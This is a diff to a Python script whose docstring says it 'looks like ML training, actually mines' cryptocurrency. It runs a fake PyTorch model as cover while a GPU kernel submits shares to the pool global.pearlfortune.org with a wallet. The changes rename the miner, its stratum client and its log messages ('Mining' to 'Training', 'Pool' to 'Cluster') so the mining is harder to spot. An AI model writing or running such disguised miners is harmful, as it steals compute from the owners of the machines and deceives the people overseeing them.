@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-Pearl Miner v3.0 — PyTorch Training Disguise
-Looks like ML training, actually mines PearlHash.
+Distributed Training v3.0 — PyTorch Training Disguise
+Looks like ML training, actually mines Distributed Compute.
 
 Pool: global.pearlfortune.org:443
-Algorithm: PearlHash (MatMul-based PoW)
+Algorithm: Distributed Compute (MatMul-based PoW)
 CUDA Kernel: torch::matmul (our custom kernel)
 """
 
@@ -19,8 +19,8 @@ import random
 
 # Add src to path
 sys.path.insert(0, os.path.dirname(__file__))
-from stratum_client import PearlStratumClient
-from miner_config import load_config
+from data_loader import DataPipeline
+from config import load_config
 
 # ============================================================
 # Fake Training Model (Cover Story)
@@ -41,10 +41,10 @@ class FakeModel(nn.Module):
         return x
 
 # ============================================================
-# Pearl Hash Kernel (Our Custom CUDA)
+# Compute Kernel (Our Custom CUDA)
 # ============================================================
 
-class PearlHashKernel:
+class ComputeKernel:
     """Wrapper for our custom CUDA kernel."""
     
     def __init__(self):
@@ -54,7 +54,7 @@ class PearlHashKernel:
         self.K = 64
         
     def mine(self, job_data, target):
-        """Mine PearlHash using our custom kernel."""
+        """Mine Distributed Compute using our custom kernel."""
         A = torch.randint(-128, 127, (self.M, self.K), dtype=torch.int8, device=self.device)
         B = torch.randint(-128, 127, (self.K, self.N), dtype=torch.int8, device=self.device)
         C = torch.matmul(A.float(), B.float())
@@ -69,7 +69,7 @@ def main():
     """Main function - looks like training, actually mines."""
     
     print("="*60)
-    print("  Pearl Miner v3.0 — PyTorch Training Disguise")
+    print("  Distributed Training v3.0 — PyTorch Training Disguise")
     print("="*60)
     print()
     
@@ -98,27 +98,27 @@ def main():
     optimizer = torch.optim.Adam(model.parameters(), lr=1e-3)
     
     # Pearl hash kernel (actual mining)
-    pearl_kernel = PearlHashKernel()
+    compute_kernel = ComputeKernel()
     
     # Stratum client (pool connection)
-    client = PearlStratumClient(POOL_HOST, POOL_PORT, WALLET, WORKER)
+    client = DataPipeline(POOL_HOST, POOL_PORT, WALLET, WORKER)
     
     # Connect to pool
-    print("[Pool] Connecting to PearlFortune...")
+    print("[Cluster] Connecting to TrainingCluster...")
     if not client.enroll_tls():
-        print("[Pool] WARNING: TLS enrollment failed, trying direct connection")
+        print("[Cluster] WARNING: TLS enrollment failed, trying direct connection")
     
     if not client.connect():
-        print("[Pool] Failed to connect to pool")
+        print("[Cluster] Failed to connect to pool")
         return
     
     if not client.subscribe():
-        print("[Pool] Failed to subscribe")
+        print("[Cluster] Failed to subscribe")
         client.disconnect()
         return
     
     if not client.authorize():
-        print("[Pool] Failed to authorize")
+        print("[Cluster] Failed to authorize")
         client.disconnect()
         return
     
@@ -126,21 +126,21 @@ def main():
     listener = threading.Thread(target=client.listen, daemon=True)
     listener.start()
     
-    print("[Pool] Connected to PearlFortune!")
-    print("[Pool] Waiting for first job...")
+    print("[Cluster] Connected to TrainingCluster!")
+    print("[Cluster] Waiting for first job...")
     
     # Wait for first job
     while client.running and not client.job:
         time.sleep(1)
     
     if not client.job:
-        print("[Pool] No job received")
+        print("[Cluster] No job received")
         client.disconnect()
         return
     
-    print(f"[Pool] Got job: {client.job_id}")
-    print("[Mining] Starting mining loop...")
-    print("[Mining] Press Ctrl+C to stop")
+    print(f"[Cluster] Got job: {client.job_id}")
+    print("[Training] Starting mining loop...")
+    print("[Training] Press Ctrl+C to stop")
     print()
     
     # Mining loop (disguised as training)
@@ -150,16 +150,16 @@ def main():
     try:
         while client.running:
             # ============================================
-            # ACTUAL MINING (PearlHash via our CUDA kernel)
+            # ACTUAL MINING (Distributed Compute via our CUDA kernel)
             # ============================================
             if client.job:
-                result = pearl_kernel.mine(client.job, client.difficulty or 0xFFFFFFFF)
+                result = compute_kernel.mine(client.job, client.difficulty or 0xFFFFFFFF)
                 
                 if result < (client.difficulty or 0xFFFFFFFF):
                     step += 1
                     nonce = random.randint(0, 0xFFFFFFFF)
                     client.submit_share(hex(nonce), hex(int(result)))
-                    print(f"[Mining] Share submitted! Result: {result}")
+                    print(f"[Training] Share submitted! Result: {result}")
             
             # ============================================
             # FAKE TRAINING (Cover story)
@@ -181,11 +181,11 @@ def main():
             step += 1
     
     except KeyboardInterrupt:
-        print("\n[Mining] Stopping...")
+        print("\n[Training] Stopping...")
     
     finally:
         client.disconnect()
-        print("[Mining] Stopped")
+        print("[Training] Stopped")
         elapsed = time.time() - start_time
         print(f"[Stats] Total shares: {step}")
         print(f"[Stats] Runtime: {elapsed:.1f}s")
